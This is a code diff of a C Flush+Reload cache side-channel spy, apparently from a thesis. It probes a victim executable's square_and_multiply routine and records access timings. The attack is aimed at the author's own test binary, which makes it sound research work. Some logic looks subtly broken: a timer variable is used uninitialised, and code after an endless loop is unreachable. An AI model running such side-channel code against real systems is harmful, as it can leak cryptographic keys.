@@ -17,7 +17,7 @@
 #define TESTEXEC_WINDOWS
 
 #define DEBUG
-
+//#define DEBUG_PLUS
 
 // probe from paper
 int probe_treshold(char *adrs)
@@ -103,13 +103,9 @@ void writer(char **target_adrs, int adrs_amount, unsigned int measurements[][CYC
 
         fclose(file);
     }
-    
 }
 
-void lurk(char* target_adrs)
-{
 
-}
 
 
 /**
@@ -133,14 +129,14 @@ void spy(char **target_adrs, int adrs_amount)
             //busy_wait((2500-tsc+old_tsc) / 50);
             tsc = rdtsc();
         }
-        #ifdef DEBUG
+        #ifdef DEBUG_PLUS
         printf("system time counter: %llu, counter diff: %llu\n", tsc, tsc-old_tsc);
         #endif
         for(int cur_adr_i=0;cur_adr_i<adrs_amount;cur_adr_i++)
         {
             char *ptr=target_adrs[cur_adr_i];
             measurements[cur_adr_i][cur_slot]=probe(ptr); 
-            #ifdef DEBUG
+            #ifdef DEBUG_PLUS
             printf("measured value for adrs %p is %i\n", ptr, measurements[cur_adr_i][cur_slot]);                             // probe
             #endif                                                                                            // add timing to array for persistence 
         }
@@ -150,11 +146,24 @@ void spy(char **target_adrs, int adrs_amount)
     printf("end spy\n");
 }
 
-// default address values (?)
-int main()
+void lurk(char* target_base_adrs, char **target_adrs, int adrs_amount)
 {
-    printf("starting\n");
+    while(1)
+    {
+        unsigned long long old_tsc, tsc = rdtsc();
+        while (tsc - old_tsc < 2500) // TODO why 2500/500 cycles per slot now, depending on printf
+        {
+            tsc = rdtsc();
+        }
+        if (probe_treshold(target_base_adrs))
+        {
+            spy(target_adrs, adrs_amount);
+        }
+    }
+}
 
+void control()
+{
     // addresses ------
     #ifdef TESTEXEC_WINDOWS
     int amount_address_offsets = 2;
@@ -162,16 +171,14 @@ int main()
     target_offset[0]=62;
     target_offset[1]=85;
 
+    char* target_base = 0x100401080;
+
     // base should be 0x100401080 (square_and_multiply) or 0x1004010fe (main)
     #endif
-
     // --------------------
-    void (*fPtrSpy)() = &spy; // omg thanks chat gpt
-    int (*fPtrMain)() = &main;
-    void (*fPtrWriter)() = &writer;
-    #ifdef DEBUG
-    printf("Adresse der Funktion spy: %p, main %p, writer %p\n", fPtrSpy, fPtrMain, fPtrWriter);
-    #endif
+
+
+
     int map_len = 10; // max size bytes?
     int file_descriptor = open("C:/cygwin64/home/thesis/flush-reload/textexec.exe", O_RDONLY); // hard coded path to open the executable used by the victim 
     void *base = mmap(NULL, map_len, PROT_READ, MAP_FILE | MAP_SHARED, file_descriptor, 0); // MAP_FILE ignored (?)
@@ -181,6 +188,7 @@ int main()
     // TODO switch off ASLR
 
     // TODO run until detection and terminate after
+
     
     char *target_adrs[amount_address_offsets];
     for (int i= 0; i<amount_address_offsets; i++)
@@ -193,8 +201,24 @@ int main()
     printf("addresses are %p and %p, binary mapped to %p \n", target_adrs[0], target_adrs[1], base); // debug
     #endif
     int adrs_amount = 2;
+    lurk(target_base, target_adrs, adrs_amount);
     printf("starting spy\n");
     spy(target_adrs, adrs_amount);
+}
+
+// default address values (?)
+int main()
+{
+    #ifdef DEBUG_PLUS
+    void (*fPtrSpy)() = &spy; // omg thanks chat gpt
+    int (*fPtrMain)() = &main;
+    void (*fPtrWriter)() = &writer;
+    void (*fPtrControl)() = &control;
+    
+    printf("Adresse der Funktion spy: %p, main %p, writer %p, control %p\n", fPtrSpy, fPtrMain, fPtrWriter, fPtrControl);
+    #endif
+    printf("starting\n");
+    control();   
     printf("finished\n");    
 }
 
